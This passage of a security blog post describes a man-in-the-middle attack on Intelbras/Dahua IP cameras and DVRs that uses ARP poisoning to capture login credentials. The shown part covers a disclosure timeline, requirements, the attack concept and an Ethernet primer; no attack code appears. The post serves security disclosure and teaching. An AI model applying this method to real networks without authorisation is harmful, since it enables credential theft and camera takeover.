@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" property="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  <title>Dahua / Intelbras MitM Attack | Lets Hack It</title>
+
+  <!-- Global -->
+  <link rel="canonical" href="https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/">
+  <meta name="generator" property="generator" content="Jekyll v4.2.2">
+  <meta name="author" property="author" content="Lucas Teske">
+  <meta name="description" property="description" content="Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My...">
+  
+  <meta name="keywords" content="Camera, Hacking, English">
+  
+  <!-- Open Graph -->
+  <meta name="og:locale" property="og:locale" content="en">
+  <meta name="og:type" property="og:type" content="article">
+  <meta name="og:title" property="og:title" content="Dahua / Intelbras MitM Attack | Lets Hack It">
+  <meta name="og:url" property="og:url" content="https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/">
+  <meta name="og:image" property="og:image" content="https://lucasteske.dev/assets/posts/medium/0_EtFMEwgxuAJGBNT0.jpg">
+  <meta name="og:site_name" property="og:site_name" content="Lets Hack It">
+  <meta name="og:description" property="og:description" content="Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My...">
+
+  <!-- Article -->
+  <meta name="article:author" property="article:author" content="https://www.facebook.com/teskeslab">
+  <meta name="article:publisher" property="article:publisher" content="https://www.facebook.com/teskeslab">
+  <meta name="article:published_time" property="article:published_time" content="2019-10-25T12:00:00-03:00">
+
+  <!-- Facebook -->
+  <meta name="fb:admins" property="fb:admins" content="1234">
+  <meta name="fb:app_id" property="fb:app_id" content="1209208119176770">
+
+  <!-- Twitter -->
+  <meta name="twitter:card" property="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" property="twitter:title" content="Dahua / Intelbras MitM Attack | Lets Hack It">
+  <meta name="twitter:site" property="twitter:site" content="@lucasteske">
+  <meta name="twitter:creator" property="twitter:creator" content="@lucasteske">
+  <meta name="twitter:description" property="twitter:description" content="Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My...">
+  <meta name="twitter:image" property="twitter:image" content="https://lucasteske.dev/assets/posts/medium/0_EtFMEwgxuAJGBNT0.jpg">
+  <meta name="twitter:image:alt" property="twitter:image:alt" content="Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My...">
+
+  <!-- JSON LD -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "url": "https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/",
+    "name": "Dahua / Intelbras MitM Attack | Lets Hack It",
+    "headline": "Dahua / Intelbras MitM Attack | Lets Hack It",
+    "keywords": "Camera,Hacking,English",
+    "description": "Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My...",
+    "articleBody": "Dahua / Intelbras MitM Attack How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password. Disclaimer: This type of attack is basically illegal anywhere in the world. My intentions with this tutorial is to demonstrate why you should ALWAYS use a TLS connection for ANYTHING. Use for you own risk. For the purpose of responsible disclosure, I contacted Intelbras on Twitter on 11/08/2019 and let them know I expected a reply from them until 17/08/2019. If they didn’t reply until then, this article would be published. On 28/08/2019 Dahua ran this proof of concept attack with their current in-market devices, and since they now use a Digest authentication mechanism they’re not vulnerable by this password leak. As for Intelbras, I’m still waiting for their contact. Please mind that legacy devices that are not sold anymore are permanently vulnerable for both Intelbras and Dahua Intelbras took a while but also contacted me and tested with few newer devices. Besides not having a Security Response team, their answer was the same as Dahua. Both companies asked me to remove their...",
+    "datePublished": "2019-10-25 12:00:00 -0300",
+    "dateModified": "2019-10-25 12:00:00 -0300",
+    "author": {
+      "@type": "Person",
+      "name": "Lucas Teske",
+      "email": "letshackit@nvx.li"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Lets Hack It",
+      "url": "https://lucasteske.dev",
+      "logo": {
+        "@type": "ImageObject",
+        "width": 32,
+        "height": 32,
+        "url": "https://lucasteske.dev/icon/favicon.ico"
+      }
+    },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/"
+    },
+    "image": {
+      "@type": "ImageObject",
+      "url": "https://lucasteske.dev/assets/posts/medium/0_EtFMEwgxuAJGBNT0.jpg"
+    }
+  }
+  </script>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+  <link rel="stylesheet" href="/assets/theme.css">
+  <link rel="stylesheet" href="/assets/flag-icon.min.css">
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="manifest" href="/assets/site.webmanifest">
+  <link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/assets/favicon.ico">
+  <meta name="msapplication-TileColor" property="msapplication-TileColor" content="#da532c">
+  <meta name="msapplication-config" property="msapplication-config" content="/assets/browserconfig.xml">
+  <meta name="theme-color" property="theme-color" content="#ffffff">
+
+  <!-- Custom Scripts -->
+  <script async src="/assets/syntaxhighlighter.min.js"></script>
+  <script async src="/assets/simple-jekyll-search.min.js"></script>
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="https://lucasteske.dev/feed.xml" title="Lets Hack It">
+
+  <!-- Google Analytics-->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-32251405-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-32251405-2');
+</script>
+  
+</head>
+
+  <body>
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/pt_BR/sdk.js#xfbml=1&amp;version=v4.0&amp;appId=1209208119176770&amp;autoLogAppEvents=1"></script>
+    <div class="like-box">
+      <div class="fb-like" data-href="https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/" data-width="" data-layout="box_count" data-action="like" data-size="large" data-show-faces="true" data-share="true"></div>
+    </div>
+    <a href="https://github.com/racerxdl/letshackit" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+    <main class="site">
+      
+<br>
+<img src="/assets/cropped-logo.png" style="margin-left: auto; margin-right: auto;">
+<ul class="language-bar">
+  
+  
+  <a class="link-pt flag-icon flag-icon-us" href="/2019/10/dahua-intelbras-mitm-attack/"></a>
+  <a class="link-en flag-icon flag-icon-br" href="/pt/2019/10/dahua-intelbras-mitm-attack/"></a>
+</ul>
+<nav class="nav">
+  <div class="nav-container" style="height: 50px">
+    <ul class="navul">
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/donate">Donate</a></li>
+      <li><a href="/calculators">Calculators</a></li>
+      <li><a href="/my-presentations">My Presentations</a></li>
+      <li><a href="/satcom-projects">Satcom Projects</a></li>
+      <li><a href="/my-tesla-coils">My Tesla Coils</a></li>
+      <li><a href="/biggateboy">Big Gate Boy</a></li>
+      <li><a href="/about">About</a></li>
+    
+    </ul>
+  </div>
+</nav>
+<div class="social-icon">
+  <ul>
+    <li class="btn-a btn-svg btn-twitch">
+      <a href="https://twitch.tv/racerxdl">
+        <svg role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><title>Twitch icon</title>
+<path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714Z"></path></svg>
+
+        RacerXDL
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-twitter">
+      <a href="https://twitter.com/lucasteske">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter icon</title>
+<path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"></path></svg>
+        @lucasteske
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-instagram">
+      <a href="https://instagram.com/racerxdl/">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram icon</title>
+<path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"></path></svg>
+        @racerxdl
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-facebook">
+      <a href="https://www.facebook.com/teskeslab">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Facebook icon</title>
+<path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"></path></svg>
+        Teske's Lab
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-github">
+      <a href="https://github.com/racerxdl">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub icon</title>
+<path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg>
+        @racerxdl
+      </a>
+    </li>
+<br>
+    <li class="btn-a btn-svg btn-youtube">
+      <a href="https://www.youtube.com/c/TeskesLab">
+        <svg role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><title>YouTube icon</title>
+<path d="M23.495 6.205a3.007 3.007 0 0 0-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 0 0 .527 6.205a31.247 31.247 0 0 0-.522 5.805 31.247 31.247 0 0 0 .522 5.783 3.007 3.007 0 0 0 2.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 0 0 2.088-2.088 31.247 31.247 0 0 0 .5-5.783 31.247 31.247 0 0 0-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"></path></svg>
+        Teske's Lab
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-linkedin">
+      <a href="https://www.linkedin.com/in/lucas-teske-8206301b/">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LinkedIn icon</title>
+<path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg>
+        Lucas Teske
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-code-stats">
+      <a href="https://codestats.net/users/racerxdl">
+        <?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="360px" height="360px" viewbox="0 0 360 360" enable-background="new 0 0 360 360" xml:space="preserve">
+<path d="M174,81.741v27.509C161.913,104,133.5,93.5,109.789,94.6c-23.859,1.107-42.172,7.301-54.859,21.902
+	c-12.689,14.603-19.033,35.71-19.033,63.326c0,27.524,6.344,48.585,19.033,63.186c12.687,14.603,30.974,21.901,54.859,21.901
+	c12.127,0,41.461-5.665,64.211-19.115v29.528c-8.75,2.672-33.75,12.422-65.891,12.818c-31.625,0.39-56.538-9.678-74.731-29.039
+	c-18.193-19.358-27.29-45.784-27.29-79.28c0-33.587,9.097-60.059,27.29-79.42c18.193-19.358,43.113-28.252,74.731-29.039
+	C133,70.75,155.808,77.431,174,81.741z M341.423,82.005v27.569c-10.729-5.13-20.852-8.957-30.368-11.476s-18.707-3.778-27.569-3.778
+	c-15.395,0-27.268,2.987-35.616,8.957c-8.352,5.972-12.525,14.462-12.525,25.47c0,9.236,2.774,16.212,8.327,20.922
+	c5.55,4.712,16.069,8.515,31.558,11.406l17.073,3.499c21.084,4.013,36.643,11.08,46.673,21.202
+	c10.027,10.124,15.044,23.675,15.044,40.654c0,20.247-6.787,35.595-20.362,46.043c-13.575,10.45-33.472,15.674-59.688,15.674
+	c-9.89,0-20.41-1.119-31.558-3.358c-11.15-2.239-22.695-5.55-34.637-9.937v-29.109c11.476,6.438,22.717,11.29,33.727,14.555
+	c11.008,3.267,21.832,4.898,32.468,4.898c16.14,0,28.596-3.171,37.366-9.517c8.769-6.344,13.155-15.395,13.155-27.149
+	c0-10.262-3.149-18.285-9.447-24.071c-6.297-5.783-16.632-10.122-30.998-13.015l-17.213-3.358
+	c-21.086-4.199-36.341-10.776-45.763-19.733c-9.425-8.957-14.135-21.412-14.135-37.366c0-18.473,6.508-33.027,19.522-43.664
+	c13.015-10.636,30.95-15.954,53.81-15.954c9.796,0,19.778,0.888,29.948,2.659C320.383,75.801,330.787,78.46,341.423,82.005z"></path>
+<path d="M86.199,153.037c0-2.98,1.024-5.495,3.074-7.544c2.048-2.048,4.563-3.073,7.544-3.073c3.034,0,5.561,1.011,7.584,3.034
+	c2.022,2.023,3.034,4.55,3.034,7.584s-1.012,5.563-3.034,7.584c-2.023,2.023-4.551,3.034-7.584,3.034
+	c-2.981,0-5.496-1.024-7.544-3.074C87.223,158.533,86.199,156.018,86.199,153.037z M86.199,205.089c0-2.979,1.024-5.509,3.074-7.584
+	c2.048-2.076,4.563-3.113,7.544-3.113c2.98,0,5.495,1.037,7.544,3.113c2.048,2.075,3.074,4.604,3.074,7.584
+	c0,2.981-1.012,5.496-3.034,7.545c-2.023,2.048-4.551,3.073-7.584,3.073s-5.562-1.025-7.584-3.073
+	C87.209,210.585,86.199,208.07,86.199,205.089z M141.135,153.037c0-2.98,1.024-5.495,3.074-7.544
+	c2.048-2.048,4.563-3.073,7.544-3.073c3.034,0,5.561,1.011,7.584,3.034c2.022,2.023,3.034,4.55,3.034,7.584
+	s-1.012,5.563-3.034,7.584c-2.023,2.023-4.551,3.034-7.584,3.034c-2.981,0-5.496-1.024-7.544-3.074
+	C142.159,158.533,141.135,156.018,141.135,153.037z M141.135,205.089c0-2.979,1.024-5.509,3.074-7.584
+	c2.048-2.076,4.563-3.113,7.544-3.113c2.98,0,5.495,1.037,7.544,3.113c2.048,2.075,3.074,4.604,3.074,7.584
+	c0,2.981-1.012,5.496-3.034,7.545c-2.023,2.048-4.551,3.073-7.584,3.073s-5.563-1.025-7.584-3.073
+	C142.146,210.585,141.135,208.07,141.135,205.089z"></path>
+</svg>
+
+        racerxdl
+      </a>
+    </li>
+<br>
+    <li class="btn-a btn-svg btn-telegram">
+      <a href="https://t.me/hardwareHackingBrasil">
+        <svg role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><title>Telegram icon</title>
+<path d="M23.91 3.79L20.3 20.84c-.25 1.21-.98 1.5-2 .94l-5.5-4.07-2.66 2.57c-.3.3-.55.56-1.1.56-.72 0-.6-.27-.84-.95L6.3 13.7l-5.45-1.7c-1.18-.35-1.19-1.16.26-1.75l21.26-8.2c.97-.43 1.9.24 1.53 1.73z"></path></svg>
+        Hardware Hacking Brasil
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-patreon">
+      <a href="https://www.patreon.com/teskeslab">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Patreon</title>
+<path d="M0 .48v23.04h4.22V.48zm15.385 0c-4.764 0-8.641 3.88-8.641 8.65 0 4.755 3.877 8.623 8.641 8.623 4.75 0 8.615-3.868 8.615-8.623C24 4.36 20.136.48 15.385.48z"></path></svg>
+        Patreon
+      </a>
+    </li>
+    <li class="btn-a btn-svg btn-mastodon">
+      <a rel="me" href="https://infosec.exchange/@lucasteske">
+        <svg width="24px" height="24px" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" xml:space="preserve"><path d="M21.327 8.566c0-4.339-2.843-5.61-2.843-5.61-1.433-.658-3.894-.935-6.451-.956h-.063c-2.557.021-5.016.298-6.45.956 0 0-2.843 1.272-2.843 5.61 0 .993-.019 2.181.012 3.441.103 4.243.778 8.425 4.701 9.463 1.809.479 3.362.579 4.612.51 2.268-.126 3.541-.809 3.541-.809l-.075-1.646s-1.621.511-3.441.449c-1.804-.062-3.707-.194-3.999-2.409a4.523 4.523 0 0 1-.04-.621s1.77.433 4.014.536c1.372.063 2.658-.08 3.965-.236 2.506-.299 4.688-1.843 4.962-3.254.434-2.223.398-5.424.398-5.424zm-3.353 5.59h-2.081V9.057c0-1.075-.452-1.62-1.357-1.62-1 0-1.501.647-1.501 1.927v2.791h-2.069V9.364c0-1.28-.501-1.927-1.502-1.927-.905 0-1.357.546-1.357 1.62v5.099H6.026V8.903c0-1.074.273-1.927.823-2.558.566-.631 1.307-.955 2.228-.955 1.065 0 1.872.409 2.405 1.228l.518.869.519-.869c.533-.819 1.34-1.228 2.405-1.228.92 0 1.662.324 2.228.955.549.631.822 1.484.822 2.558v5.253z"></path></svg>
+        Mastodon
+      </a>
+    </li>
+  </ul>
+</div>
+<div class="search-input">
+  <input type="text" id="search-input" style="margin: 0 auto;" placeholder="Search blog posts...">
+</div>
+<ul id="results-container" class="results-container"></ul>
+
+      
+
+
+
+
+
+<div class="post">
+  <h1 class="post-title">Dahua / Intelbras MitM Attack</h1>
+  <div class="post-info">
+    
+      <img src="/assets/posts/medium/0_EtFMEwgxuAJGBNT0.jpg">
+    
+    <span>Written by</span>
+    
+        Lucas Teske
+    
+    
+
+    
+      <br>
+      <span>on </span><time datetime="2019-10-25 12:00:00 -0300">
+  25
+  
+  October
+  2019
+</time>
+    
+  </div>
+
+  <div class="post-line"></div>
+
+  <h1 id="dahua--intelbras-mitm-attack">Dahua / Intelbras MitM Attack</h1>
+
+<p>How to perform a very simple MitM Attack on a Intelbras/Dahua IP Cameras / DVR. This uses Ettercap to do an ARP Poison and a simple GoLang Script to fetch the username/password.</p>
+
+<p><img src="/assets/posts/medium/0_EtFMEwgxuAJGBNT0.jpg" alt="Intelbras Camera"></p>
+
+<p><strong>Disclaimer: This type of attack is basically illegal anywhere in the world. My intentions with this tutorial is to demonstrate why you should ALWAYS use a TLS connection for ANYTHING. Use for you own risk.</strong></p>
+
+<ul>
+  <li>For the purpose of responsible disclosure, I contacted Intelbras on Twitter on 11/08/2019 and let them know I expected a reply from them until 17/08/2019. If they didn’t reply until then, this article would be published.</li>
+  <li>On 28/08/2019 Dahua ran this proof of concept attack with their current in-market devices, and since they now use a Digest authentication mechanism they’re not vulnerable by this password leak. As for Intelbras, I’m still waiting for their contact. <strong>Please mind that legacy devices that are not sold anymore are permanently vulnerable for both Intelbras and Dahua</strong>
+</li>
+  <li>Intelbras took a while but also contacted me and tested with few newer devices. Besides not having a Security Response team, their answer was the same as Dahua.</li>
+  <li>Both companies asked me to remove their names from this article, but that is not fair with people that bought stuff from them. They both won’t update the old devices that are vulnerable to this article rendering millions of devices vulnerable forever.</li>
+</ul>
+
+<h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>
+    <p>One IP Camera or DVR from Intelbras / Dahua connected through Ethernet Cable (Wireless might work, but not tested)</p>
+  </li>
+  <li>
+    <p>One cellphone with the Intelbras / Dahua Application with the Camera or DVR Configured</p>
+  </li>
+  <li>
+    <p>One computer with Linux and GoLang installed</p>
+  </li>
+  <li>
+    <p>Patience to get everything to work</p>
+  </li>
+</ul>
+
+<h2 id="attack-idea">Attack Idea</h2>
+
+<p>The main idea between the is the concept of MitM (Man-in-the-Middle) using ARP Poisoning. The idea is to inform all network devices that you have the IP that belongs to the DVR, and then receive all the packets that were intended originally to the DVR. That way, when someone logs in, you will also receive the Login Packet.</p>
+
+<p>Ideal scenario: We have a direct communication between the DVR and the phone application:</p>
+
+<p><img src="/assets/posts/medium/1_Rkzka9YCf8cfzcKr_cEsPw.png" alt="Normal Communication between Smartphone and Camera"><em>Normal Communication between Smartphone and Camera</em></p>
+
+<p>Poisoning the ARP Table, we can do two types of attack: One-way which we only receive a copy of the packets in a “passive” way:</p>
+
+<p><img src="/assets/posts/medium/1_1E52IAITABsVvYJ97UwKCw.png" alt="Passive Packet Reception (One-way)"><em>Passive Packet Reception (One-way)</em></p>
+
+<p>Or in Both-ways in which we act as a full MitM and receive ALL the packets and forward to the target:</p>
+
+<p><img src="/assets/posts/medium/1_Sv4NnvJ83Zff5KrnFJuGyg.png" alt="Intercept and resend attack (Both-ways)"><em>Intercept and resend attack (Both-ways)</em></p>
+
+<p>To know how that’s possible we need a bit of knowledge of how computers discover each other and communicate over a IP Network.</p>
+
+<h2 id="ethernet-communication">Ethernet Communication</h2>
+
+<p>The main protocol used nowadays in conventional computer networks is called *Ethernet. *This protocol works in the Link layer of a network. That means it works directly over the device that connects the computers (for example your network card). That’s why we usually call a Ethernet Network. There are other types of networks, but in general, nowadays everything is Ethernet based (even if its a virtual Ethernet not a hardware one)</p>
+
+<p>So let’s see how the window of data (set of data that composes a single minimum transmission) of a Ethernet Network:</p>
+
+<p><img src="https://cdn-images-1.medium.com/max/3840/0_3ZKSqz4g9c0iHAum.png" alt="Ethernet Window"><em>Ethernet Window</em></p>
+
+<ul>
+  <li>
+    <p><em>Preamble</em>: That portion of the window tells the network card that a set of data is coming. It usually contains a magic number that is repeated over and over for a small period of time. Think about a “Hello” when you’re answering a phone call, to let the other side know that you’re about to say something.</p>
+  </li>
+  <li>
+    <p><em>SFD (Start of Frame Delimiter)</em>: That portion says that that the Preamble is over. That way the network card knows that relevant data for Ethernet is coming next.</p>
+  </li>
+  <li>
+    <p><em>Destination MAC Address / Source MAC Address</em>: Each network card, in any device, has a *unique number *which identifies it. That number has 6 groups of 2 hexadecimal digits (6 bytes) where the first three groups say which manufacturer did that device, and the last 3 say the device number (usually manufacturer sequence). Ideally every device in the world has a unique MAC Address (which is not always true).</p>
+  </li>
+  <li>
+    <p>EtherType: This field says which type of packet will be transmitted in this ethernet window. For example a hexadecimal value of 08 00 says its an IPv4 packet.</p>
+  </li>
+  <li>
+    <p>Payload: This field contains the data that are being transmitted. What bytes are in this field depends exclusively on the protocol type that is being used.</p>
+  </li>
+  <li>
+    <p>FCS (Frame Check Sequence): That field contains a number that is calculated using all previous bytes using a very specific mathematical formula (CRC32). That field is used as a check to see if any data has been corrupted during transmission</p>
+  </li>
+</ul>
+
